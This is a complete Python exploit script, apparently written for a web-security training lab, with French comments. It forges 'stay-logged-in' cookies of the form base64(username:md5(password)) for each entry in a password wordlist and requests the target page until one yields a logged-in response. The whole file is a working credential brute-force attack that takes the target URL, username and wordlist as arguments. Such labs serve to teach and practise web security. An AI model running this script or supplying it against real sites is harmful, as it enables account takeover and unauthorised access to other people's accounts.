#!/usr/bin/env python3
import sys
import hashlib
import base64
import requests

def forge_cookie(username, password):
    """Génère cookie stay-logged-in: base64(username:md5(password))"""
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    cookie_value = f"{username}:{md5_hash}"
    return base64.b64encode(cookie_value.encode()).decode()

def exploit(target_url, username, password_file):
    """Brute-force le cookie avec la liste de passwords"""
    print(f"[*] Target: {target_url}")
    print(f"[*] Username: {username}")
    print(f"[*] Password file: {password_file}\n")

    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords\n")

    for password in passwords:
        cookie = forge_cookie(username, password)
        cookies = {'stay-logged-in': cookie}

        try:
            response = requests.get(target_url, cookies=cookies, allow_redirects=False)

            # Si pas de redirect 302 = cookie valide
            if "logout" in response.text:
                print(f"\n[+] SUCCESS!")
                print(f"[+] Password: {password}")
                print(f"[+] Cookie: {cookie}")
                return
            else:
                print(f"[-] Failed: {password}", end='\r')

        except Exception as e:
            print(f"[!] Error: {e}")
            continue

    print("\n[-] No valid password found")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 exploit.py <url> <username> <password_file>")
        print("Example: python3 exploit.py https://lab.net/my-account carlos passwords.txt")
        sys.exit(1)

    target_url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    exploit(target_url, username, password_file)